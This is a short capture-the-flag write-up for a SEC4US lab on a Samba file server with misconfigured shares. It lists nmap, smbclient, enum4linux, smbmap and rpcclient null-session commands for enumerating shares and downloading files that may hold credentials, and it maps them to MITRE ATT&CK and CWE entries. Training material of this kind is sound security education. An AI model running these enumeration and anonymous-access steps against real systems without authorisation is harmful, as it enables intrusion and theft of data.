# Maq110: Servidor de Arquivos

Writeup for the **Servidor de Arquivos** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Easy
> **Difficulty:** Easy
> **Points:** 110

---

## Overview

A file server exposing SMB/Samba shares with misconfigured permissions. Anonymous or weakly authenticated access to sensitive shares reveals the path to the flag.

## Reconnaissance

```bash
nmap -sV -sC -p- [TARGET_IP] -oN nmap_scan.txt
```

Ports 139 and 445 (SMB) should be open. Enumerate shares:

```bash
smbclient -L //[TARGET_IP] -N
enum4linux -a [TARGET_IP]
```

List available shares and check for anonymous access:

```bash
smbmap -H [TARGET_IP]
```

## Exploitation

Connect to accessible shares:

```bash
smbclient //[TARGET_IP]/[SHARE_NAME] -N
```

Browse the share contents, download interesting files:

```smb
smb: \> ls
smb: \> get [FILENAME]
```

If anonymous access is denied, try common credentials or null sessions:

```bash
rpcclient -U "" -N [TARGET_IP]
```

Examine downloaded files for credentials, configurations, or the flag itself.

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Network Share Discovery | T1135 |
| Data from Network Shared Drive | T1039 |
| Valid Accounts: Default Accounts | T1078.001 |

### CWE

- **CWE-276:** Incorrect Default Permissions
- **CWE-287:** Improper Authentication

---

A file server with open shares is a library with no librarian: anyone who walks in can browse, copy, and leave without a trace.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
